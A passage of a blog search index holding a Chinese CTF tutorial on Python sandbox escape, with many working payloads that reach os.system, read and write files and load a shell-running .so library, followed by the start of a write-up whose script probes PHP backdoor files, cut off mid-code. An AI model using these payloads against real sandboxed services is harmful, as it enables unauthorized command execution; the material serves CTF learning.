Ctfshow($a)));","categories":[],"tags":[{"name":"CTFshow","slug":"CTFshow","permalink":"http://www.moonback.xyz/tags/CTFshow/"},{"name":"wirteup","slug":"wirteup","permalink":"http://www.moonback.xyz/tags/wirteup/"}]},{"title":"Python沙箱逃逸","slug":"Python沙箱逃逸","date":"2020-02-16T13:50:53.000Z","updated":"2020-06-25T05:54:16.967Z","comments":true,"path":"2020/02/16/Python沙箱逃逸/","link":"","permalink":"http://www.moonback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/","excerpt":"本篇博客主要介绍了python沙箱逃逸的相关内容！","text":"本篇博客主要介绍了python沙箱逃逸的相关内容！ 沙箱逃逸的概念沙箱逃逸，就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程。 命名空间名空间是名称到对象的映射；按照变量定义的位置，有以下分类： Local，局部命名空间，每个函数所拥有的命名空间，记录了函数中定义的所有变量 Global，全局命名空间，每个模块加载执行时创建的，记录了模块中定义的变量 Built-in，内建命名空间，任何模块均可访问 上述三种命名空间的生命周期如下： Local，在函数调用时才被创建，当函数返回结果或抛出异常时被删除 Global，在模块加载时被创建，一直保留到python解释器退出 Built-in，在python解释器启动时创建，一直保留到python解释器退出 像len，print这些函数，我们并不需要引入模块而直接可以去调用，因此这些函数都来自内建命名空间 常用的内建属性__class____class__同type()，都可查看对象所在的类： 12345678910&gt;&gt;&gt; class Student():... def __init__(self, name):... self.name = name... &gt;&gt;&gt; stu = Student(&#x27;ling&#x27;)&gt;&gt;&gt; type(stu)&lt;class &#x27;__main__.Student&#x27;&gt;&gt;&gt;&gt; stu.__class__&lt;class &#x27;__main__.Student&#x27;&gt;&gt;&gt;&gt; __base__可以获取类的一个基类，一般情况下是object，有时不是，例如继承类的时候： 1234567891011121314&gt;&gt;&gt; class Student():... def __init__(self, name):... self.name = name... &gt;&gt;&gt; stu = Student(&#x27;ling&#x27;)&gt;&gt;&gt; stu.__class__.__base__&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; class Student2(Student):... pass... &gt;&gt;&gt; stu2 = Student2()&gt;&gt;&gt; stu2.__class__.__base__&lt;class &#x27;__main__.Student&#x27;&gt; __mro__以元祖的形式返回整个继承链的关系： 12&gt;&gt;&gt; stu2.__class__.__mro__(&lt;class &#x27;__main__.Student2&#x27;&gt;, &lt;class &#x27;__main__.Student&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;) 上面显示了Student2继承自Student，Student继承自object；因此可以直接获取object类： 12&gt;&gt;&gt; stu2.__class__.__mro__[-1]&gt;&gt;&gt; &lt;class &#x27;object&#x27;&gt; __subclasses__()上述两种方法可以得到object类，但如果代码中没有Student类，我们可以用利用python自带的对象(一切皆为对象)： 12345678&gt;&gt;&gt; [].__class__.__base__&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; &#123;&#125;.__class__.__base__&lt;class &#x27;object&#x27;&gt; 得到object类后，就可以用__subclasses__()方法获得所有继承此类的子类： 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;...... 注：没有限制的话，object类是直接可以使用的 __dict__我们在获得到一个模块时想调用模块中的方法，恰好该方法被过滤了，就可以用该方法bypass 12345&gt;&gt;&gt; import os&gt;&gt;&gt; os.system(&#x27;ls&#x27;)1 2&gt;&gt;&gt; os.__dict__[&#x27;s&#x27;+&#x27;ystem&#x27;](&#x27;ls&#x27;)1 2 与dir()作用相同，都是返回属性、方法等；但一些数据类型是没有__dict__属性的，如[].__dict__会返回错误 __dict__只会显示属于自己的属性，dir()除了显示自己的属性，还显示从父类继承来的属性 可以使用__dict__来间接调用一些属性或方法，如： 1234&gt;&gt;&gt; a = []&gt;&gt;&gt; [].__class__.__dict__[&#x27;append&#x27;](a, &#x27;ling&#x27;)&gt;&gt;&gt; a[&#x27;ling&#x27;] __init____init__用于初始化类，在沙盒逃逸中的作用就是为了得到function/method类型： 12345678910111213141516&gt;&gt;&gt; class Base:... def __init__(self, a, b):... self.a = a... def func():... pass... &gt;&gt;&gt; class Child(Base):... pass... &gt;&gt;&gt; Child&lt;class &#x27;__main__.Child&#x27;&gt;&gt;&gt;&gt; &gt;&gt;&gt; Child.__init__&lt;function Base.__init__ at 0x7f40d32ed268&gt;&gt;&gt;&gt; Child.func&lt;function Base.func at 0x7f40d32ed2f0&gt; __globals__该属性是函数/方法特有的属性，记录当前文件的全局变量的值 1234567891011121314151617181920&gt;&gt;&gt; def func():... pass... &gt;&gt;&gt; dir(func)[&#x27;__annotations__&#x27;, &#x27;__call__&#x27;, &#x27;__class__&#x27;, &#x27;__closure__&#x27;, &#x27;__code__&#x27;, &#x27;__defaults__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dict__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__get__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__globals__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;, &#x27;__kwdefaults__&#x27;, &#x27;__le__&#x27;, &#x27;__lt__&#x27;, &#x27;__module__&#x27;, &#x27;__name__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__qualname__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;] &gt;&gt;&gt; class Student:... def __init__(self):... pass... &gt;&gt;&gt; stu = Student()&gt;&gt;&gt; stu.__init__&lt;bound method Student.__init__ of &lt;__main__.Student instance at 0x7fba95e03cb0&gt;&gt;&gt;&gt;&gt; stu.__init__.__globals__&#123;&#x27;func&#x27;: &lt;function func at 0x7fba95db5d70&gt;, &#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__package__&#x27;: None, &#x27;stu&#x27;: &lt;__main__.Student instance at 0x7fba95e03cb0&gt;, &#x27;Student&#x27;: &lt;class __main__.Student at 0x7fba95da29a8&gt;, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None&#125;&gt;&gt;&gt; Student.__init__.__globals__&#123;&#x27;func&#x27;: &lt;function func at 0x7fba95db5d70&gt;, &#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__package__&#x27;: None, &#x27;stu&#x27;: &lt;__main__.Student instance at 0x7fba95e03cb0&gt;, &#x27;Student&#x27;: &lt;class __main__.Student at 0x7fba95da29a8&gt;, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None&#125;&gt;&gt;&gt; Student.__init__&lt;unbound method Student.__init__&gt;&gt;&gt;&gt; 按照上面的思路，我们可以用__base__获取到所有类的父类Object类，然后再用__subclasses__()获取所有继承此类的子类，这样我们就能成功的利用这些类了 如果该关键字被过滤了我们可以，以下两者等效 12__init__.__globals__[&#x27;sys&#x27;]__init__.__getattribute__(&#x27;__global&#x27;+&#x27;s__&#x27;)[&#x27;sys&#x27;] builtins、builtin与builtins先说一下，builtin、builtins，__builtin__与__builtins__的区别：首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如chr、open。之所以可以这样，是因为 Python 有个叫内建模块（或者叫内建命名空间）的东西，它有一些常用函数，变量和类，上面说过。另外，Python 对函数、变量、类等等的查找方式是按 LEGB 规则来找的，其中 B 即代表内建模块。 在 2.x 版本中，内建模块被命名为 __builtin__，到了 3.x 就成了 builtins。它们都需要 import 才能查看： 2.x： 123&gt;&gt;&gt; import __builtin__&gt;&gt;&gt; __builtin__&lt;module &#x27;__builtin__&#x27; (built-in)&gt; 3.x： 123&gt;&gt;&gt; import builtins&gt;&gt;&gt; builtins&lt;module &#x27;builtins&#x27; (built-in)&gt; 而__builtins__ 两者都有，实际上是__builtin__和builtins 的引用。它不需要导入，估计是为了统一 2.x 和 3.x。不过__builtins__与__builtin__和builtins是有一点区别的，__builtins__ 相对实用一点，并且在 __builtins__里有很多好东西： 123456789&gt;&gt;&gt; &#x27;__import__&#x27; in dir(__builtins__)True&gt;&gt;&gt; __builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)macr0phag30&gt;&gt;&gt; &#x27;eval&#x27; in dir(__builtins__)True&gt;&gt;&gt; &#x27;execfile&#x27; in dir(__builtins__)True 那么既然__builtins__有这么多危险的函数，不如将里面的危险函数破坏了： 1__builtins__.__dict__[&#x27;eval&#x27;] = &#x27;not allowed&#x27; 或者直接删了： 1del __builtins__.__dict__[&#x27;eval&#x27;] 但是我们可以利用 reload(__builtins__) 来恢复 __builtins__。不过，我们在使用 reload 的时候也没导入，说明reload也在 __builtins__里，那如果连reload都从__builtins__中删了，就没法恢复__builtins__了，需要另寻他法。 这里注意，2.x 的 reload 是内建的，3.x 需要 import imp，然后再 imp.reload。同样也可以reload其他模块。 花式import对于防御者来说,最基础的思路,就是对代码的内容进行检查最常见的方法呢,就是禁止引入敏感的包，举个例子： 1234567import recode = open(&#x27;code.py&#x27;).read()pattern = re.compile(&#x27;import\\s+(os|commands|subprocess|sys)&#x27;)match = re.search(pattern,code)if match: print &quot;forbidden module import detected&quot; raise Exception 用以上的几行代码,就可以简单的完成对于敏感的包的检测 我们知道,要执行shell命令,必须引入os/commands/subprocess这几个包,对于攻击者来说,改如何绕过呢,必须使用其他的引入方式 importimport可以用来导入一个包，在模块导入的时候，默认在当前目录下查找，然后再在系统中查找，系统查找的范围是sys.path下的所有路径： import的本质是：搜索modules并绑定到局部变量 import module_name实质是将module_name.py中的全部代码加载到内存并赋值给与模块同名的变量写在当前文件中，这个变量的类型是module 现在设置一下modules中os的值为None： 12345&gt;&gt;&gt; sys.modules[&#x27;os&#x27;] = None&gt;&gt;&gt; import os&gt;&gt;&gt; Traceback (most recent call last):&gt;&gt;&gt; File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;&gt;&gt;&gt; ImportError: No module named os 发现把os从modules中删去就不能直接引入了；但是，我们可以接着设置os的模块的路径，从而引入该模块： 123&gt;&gt;&gt; sys.modules[&#x27;os&#x27;] = &#x27;/usr/lib/python2.7/os.py&#x27;&gt;&gt;&gt; import os&gt;&gt;&gt; 注意，这里不能用 del sys.modules[&#39;os&#39;]，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。 所以删了 sys.modules[&#39;os&#39;] 只会让 Python 重新加载一次 os。 看到这你肯定发现了，对于上面的过滤方式，绕过的方式可以是这样： 12345sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27; # oj 为你加的del sys.modules[&#x27;os&#x27;]import osos.system(&#x27;ls&#x27;) 如果sys模块也不能用，那么就不能通过设置路径来重新引入模块了，但可以使用python的内建函数： execfile：execfile() 函数可以用来执行一个文件(python2) exec：执行存储在字符串或文件中的python语句；python2的exec是一个内置语句而不是函数；python3将python2中的exec和execfile()功能整合到一个exec()函数中了 例如(python2)： 12&gt;&gt;&gt; execfile(&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py&#39;)&gt;&gt;&gt; system(&#39;ls &#x2F;&#39;) 或者： 12&gt;&gt;&gt; exec open(&#x27;/usr/lib/python2.7/os.py&#x27;)&gt;&gt;&gt; system(&#x27;ls /&#x27;) __import__()__import__作为一个函数，只能接受字符串参数，返回值可以直接用来操作；通常在动态加载的时候用到这个函数 123&gt;&gt;&gt; __import__(&#x27;re&#x27;).findall(&#x27;(hi)&#x27;, &#x27;hilinghi&#x27;)[&#x27;hi&#x27;, &#x27;hi&#x27;]&gt;&gt;&gt; importlibimportlib模块是对import和__import__()的补充；它也可以通过传入字符串来引入一个模块 123&gt;&gt;&gt; import importlib&gt;&gt;&gt; a = importlib.import_module(&#x27;os&#x27;)&gt;&gt;&gt; a.chdir(&#x27;../&#x27;) dir 与 __dict__这两种方法都是一个目的,那就是列出一个模组/类/对象 下面 所有的属性和函数这在沙盒逃逸中是很有用的,可以找到隐藏在其中的一些东西 1234&gt;&gt;&gt; A.__dict__mappingproxy(&#123;&#x27;b&#x27;: &#x27;asdas&#x27;, &#x27;__dict__&#x27;: &lt;attribute &#x27;__dict__&#x27; of &#x27;A&#x27; objects&gt;, &#x27;a&#x27;: 1, &#x27;__doc__&#x27;: None, &#x27;__weakref__&#x27;: &lt;attribute &#x27;__weakref__&#x27; of &#x27;A&#x27; objects&gt;, &#x27;c&#x27;: &lt;function A.c at 0x7f18ea25e510&gt;, &#x27;__module__&#x27;: &#x27;__main__&#x27;&#125;)&gt;&gt;&gt; dir(A)[&#x27;__class__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dict__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__le__&#x27;, &#x27;__lt__&#x27;, &#x27;__module__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;__weakref__&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;] 常用的模块和方法执行命令和代码os模块12__import__(&quot;os&quot;).system(&quot;ls&quot;)__import__(&quot;os&quot;).popen(&quot;ls&quot;).read() platform模块12import platformplatform.popen(&#x27;dir&#x27;).read() subprocess模块1234567import subprocesssubprocess.call(&#x27;ls&#x27;,shell=True)subprocess.Popen(&#x27;ls&#x27;, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()# stdin, stdout, stderr： 分别表示程序标准输入、输出、错误句柄。# python3subprocess.run(&#x27;ls&#x27;,shell=True) 如果shell=True的话，curl命令是被Bash(Sh)启动，所以支持shell语法。 如果shell=False的话，启动的是可执行程序本身，后面的参数不再支持shell语法。 文件file()函数该函数只存在于Python2，Python3不存在 1file(&#x27;test.txt&#x27;).read() open()函数1open(&#x27;text.txt&#x27;).read() bypass的一些套路字符串过滤如果沙箱对导入的包名称做了限制，我们可以在导入模块前先对模块名称做处理，如： 123456&gt;&gt;&gt; &#x27;os&#x27;.encode(&#x27;base64&#x27;)&#x27;b3M=\\n&#x27;&gt;&gt;&gt; a = __import__(&#x27;b3M=\\n&#x27;.decode(&#x27;base64&#x27;))&gt;&gt;&gt; a.chdir(&#x27;../&#x27;)&gt;&gt;&gt; a.getcwd()&#x27;/home&#x27; 代码中要是出现 os，直接不让运行。那么可以利用字符串的各种变化来引入 os： 1234__import__(&#x27;so&#x27;[::-1]).system(&#x27;ls&#x27;)b = &#x27;o&#x27;a = &#x27;s&#x27;__import__(a+b).system(&#x27;ls&#x27;) 还可以利用 eval 或者 exec： 12345&gt;&gt;&gt; eval(&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;[::-1])macr0phag30&gt;&gt;&gt; exec(&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;[::-1])macr0phag3 eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、base64、hex、rot13…等等 getattr()__globals__：返回一个当前空间下能使用的模块，方法和变量的字典 123456789101112&gt;&gt;&gt; class test():... name=&quot;Moonback&quot;... def run(self):... return &quot;HelloWorld&quot;...&gt;&gt;&gt; t=test()&gt;&gt;&gt; getattr(t,&quot;name&quot;)#获取name属性，存在就打印出来。&#x27;Moonback&#x27;&gt;&gt;&gt; getattr(t,&quot;run&quot;)#获取run方法，存在就打印出方法的内存地址。&lt;bound method test.run of &lt;__main__.test object at 0x00000110F74FC4E0&gt;&gt;&gt;&gt;&gt; getattr(t,&quot;run&quot;)() #获取run方法，后面加括号可以将这个方法运行。&#x27;HelloWorld&#x27; 如果.被waf,可以用getattr()来替代。payload： 1[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;ls&#x27;) 转换过程 123456[].__class__ ==&gt; getattr([],&#x27;__class__&#x27;)[].__class__.__base__ ==&gt; getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;)[].__class__.__base__.__subclasses__()[59] ==&gt; getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59]#后面有括号[].__class__.__base__.__subclasses__()[59].__init__ ==&gt; getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;)[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;] ==&gt; getattr(getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;),&#x27;__globals__&#x27;)[&#x27;linecache&#x27;][].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;] ==&gt; getattr(getattr(getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;),&#x27;__globals__&#x27;)[&#x27;linecache&#x27;],&#x27;__dict__&#x27;)[&#x27;os&#x27;] 最终payload 1getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;),&#x27;__globals__&#x27;)[&#x27;linecache&#x27;],&#x27;__dict__&#x27;)[&#x27;os&#x27;],&#x27;system&#x27;)(&#x27;ls&#x27;) 这种方法的好处是绕过.并且函数名或属性名都用字符串的方式写入payload中。那么可拓展的方法就有很多，例如： 如果_被waf了,可以用dir(0)[0][0]代替 12&gt;&gt;&gt; dir(0)[0][0]&#x27;_&#x27; 比如上面的payload可以转换为 1getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#x27;class&#x27;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#x27;base&#x27;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#x27;subclasses&#x27;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#x27;init&#x27;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#x27;globals&#x27;+dir(0)[0][0]*2)[&#x27;linecache&#x27;],dir(0)[0][0]*2+&#x27;dict&#x27;+dir(0)[0][0]*2)[&#x27;os&#x27;],&#x27;system&#x27;)(&#x27;ls&#x27;) __getattribute__()__getattribute__是属性访问拦截器，就是当这个类的属性被访问时，会自动调用类的__getattribute__方法。通过__getattribute__我们可以传字符串来进行方法的调用 123456789&gt;&gt;&gt; class Test(object):... def __init__(self):... self.name=&#x27;Test&#x27;... def echo(self):... print(self.name)...&gt;&gt;&gt; a=Test()&gt;&gt;&gt; a.__getattribute__(&#x27;echo&#x27;)()Test 应用场景: 比如说一个沙盒waf了’ls’导致属性’globals’不能用，那么payload 1().__class__.__mro__[-1].__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;system&#x27;](&#x27;ls&#x27;) 可以转换为 1().__class__.__mro__[-1].__subclasses__()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&quot;linecache&quot;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;system&#x27;](&#x27;l&#x27;+&#x27;s&#x27;) func_globals: 这个属性指向定义函数时的全局命名空间，返回它所有调用的基类和函数__init__： 返回一个函数对象__dict__：返回所有属性，包括属性，方法等 构造so库在().__class__.__bases__[0].__subclasses__()中发现有可用的类 123&lt;type &#x27;file&#x27;&gt;&lt;class &#x27;ctypes.CDLL&#x27;&gt;&lt;class &#x27;ctypes.LibraryLoader&#x27;&gt; 构造一个so库，列一下/home/ctf/下的文件 123456#include &lt;stdio.h&gt; void my_init(void) __attribute__((constructor)); void my_init(void) &#123; system(&quot;ls -la /home/ctf/ &gt; /tmp/ls_home_ctf&quot;);&#125; 将编译好的so直接二进制写入/tmp/bk.so使用ctypes加载so 1().__class__.__bases__[0].__subclasses__()[86](().__class__.__bases__[0].__subclasses__()[85]).LoadLibrary(&#x27;/tmp/bk.so&#x27;) f修饰符在PEP 498中引入了新的字符串类型修饰符：f或F，用f修饰的字符串将可以执行代码。可以参考此文档 https://www.python.org/dev/peps/pep-0498/ 只有在python3.6.0+的版本才有这个方法。简单来说，可以理解为字符串外层套了一个exec() 123456&gt;&gt;&gt; f&#x27;&#123;print(&quot;MoonBack&quot;)&#125;&#x27;MoonBack&#x27;None&#x27;&gt;&gt;&gt; f&#x27;&#123;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#125;&#x27; 驱动器 C 中的卷是 Windows..... 这个有点类似于php中的&lt;?php &quot;$&#123;@phpinfo()&#125;&quot;; ?&gt;，但python中没有将普通字符串转成f字符串的方法，所以实际使用时效果不明。 一些常用payload利用file类完成文件读取利用object子类中的file方法 1().__class__.__bases__[0].__subclasses__()[40] 上述返回的内容是，相当于open()函数 12().__class__.__bases__[0].__subclasses__()[40](&#x27;test.py&#x27;).read()# 等价于 open(&#x27;test.py&#x27;).read() 调用其他类中的OS模块完成命令执行在当前沙箱中，import等模块被禁用，但是，在别的模块中如果本身加载有os的模块，我们是可以直接调用的。如下所示 123456789class &#x27;warnings.catch_warnings&#x27;# 在这个类中，调用了os模块，我们可以间接把os模块调用进来。# win 32().__class__.__bases__[0].__subclasses__()[54]# linux 2().__class__.__bases__[0].__subclasses__()[59]# linux 2 print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;))# func_globals:返回一个包含函数全局变量的字典引用； 遍历找到其他的逃逸方法通过上面的一些绕过姿势我们发现，无外乎是利用 subclasses 中的一些特殊的方法或者模块然后来调用一些函数或者模块来读取文件，或者执行命令，那么我们可以遍历所有的系统库，然后找到所有的使用了os等模块的模块，最后遍历 subclasses 列表，找到所有可以绕过的姿势。 包包哥的python2 payload 123456789101112131415161718192021# 利用file()函数读取文件：（写类似）().__class__.__bases__[0].__subclasses__()[40](&#x27;./test.py&#x27;).read()# 执行系统命令：().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].os.system(&#x27;ls&#x27;)# 执行系统命令：().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)# 重新载入__builtins__：().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;ls&quot;)#读文件().__class__.__bases__[0].__subclasses__()[40](r&#x27;C:\\1.php&#x27;).read()#写文件().__class__.__bases__[0].__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)#执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /var/www/html&quot;).read()&#x27; )# 利用 __getattibute__ 方法x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == &#x27;ca&#x27;+&#x27;tch_warnings&#x27;][0].__init__x.__getattribute__(&quot;func_global&quot;+&quot;s&quot;)[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;l&#x27;+&#x27;s&#x27;) n3k0大哥的python3 payloadpython3各个小版本之间有区别，有的payload可以用于py3.7 有的可以用于py3.5 123456789().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&#x27;system&#x27;](&#x27;ls&#x27;)().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;system&#x27;](&#x27;ls&#x27;)().__class__.__bases__[0].__subclasses__()[104].__init__.__getattribute__(&#x27;__global&#x27;+&#x27;s__&#x27;)[&#x27;sy&#x27;+&#x27;s&#x27;].modules[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;) 参考： www.gtfly.top/2019/07/25/python沙盒逃逸学习.[html](www.gtfly.top/2019/07/25/python沙盒逃逸学习.html) https://xz.aliyun.com/t/52 https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/[](https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/) https://www.freebuf.com/articles/system/203208.html","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"python","slug":"python","permalink":"http://www.moonback.xyz/tags/python/"}]},{"title":"buuctf刷题-综合篇","slug":"buuctf刷题-综合篇","date":"2020-02-13T14:12:16.000Z","updated":"2021-03-09T06:17:52.860Z","comments":true,"path":"2020/02/13/buuctf刷题-综合篇/","link":"","permalink":"http://www.moonback.xyz/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/","excerpt":"记一下综合题目的writeup!","text":"记一下综合题目的writeup! [强网杯 2019]高明的黑客writeup下载www.tar.gz发现是3000多个php后门文件，不过都是执行代码的，写个脚本跑下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import osimport requestsimport reimport threadingimport timeprint(&#x27;开始时间： &#x27;+ time.asctime( time.localtime(time.time()) ))s1=threading.Semaphore(100) #这儿设置最大的线程数filePath = r&quot;C:/Users/Desktop/www/src&quot;os.chdir(filePath) #改变当前的路径requests.adapters.DEFAULT_RETRIES = 5 #设置重连次数，防止线程数过高，断开连接files = os.listdir(filePath)session = requests.Session()session.keep_alive = False # 设置连接活跃状态为Falsedef get_content(file): s1.acquire() print(&#x27;trying &#x27;+file+ &#x27; &#x27;+ time.asctime( time.localtime(time.time()) )) with open(file,encoding=&#x27;utf-8&#x27;) as f: #打开php文件，提取所有的$_GET和$_POST的参数 gets = list(re.findall(r&#x27;\\$_GET\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;, f.read())) posts = list(re.findall(r&#x27;\\$_POST\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;, f.read())) data = &#123;&#125; #所有的$_POST params = &#123;&#125; #所有的$_GET for m in gets: params[m] = &quot;echo &#x27;xxxxxx&#x27;;&quot; for n in posts: data[n] = &quot;echo &#x27;xxxxxx&#x27;;&quot; url = &#x27;http://127.0.0.1/src/&#x27;+file req = session.post(url, data=data, params=params) #一次性请求所有的GET和POST req.close() # 关闭请求 释放内存 req.encoding = &#x27;utf-8&#x27; content = req.text #print(content) if &quot;xxxxxx&quot; in content: #如果发现有可以利用的参数，继续筛选出具体的参数 flag = 0 for a in gets: req = session.get(url+&#x27;?%s=&#x27;%a+&quot;echo &#x27;xxxxxx&#x27;;&quot;) content = req.text req.close() # 关闭请求 释放内存 if &quot;xxxxxx&quot; in content: flag = 1 break if flag != 1: for b in posts: req = session.post(url, data=&#123;b:&quot;echo &#x27;xxxxxx&#x27;;&quot;&#125;) content = req.text req.close() # 关闭请求 释放内存 if 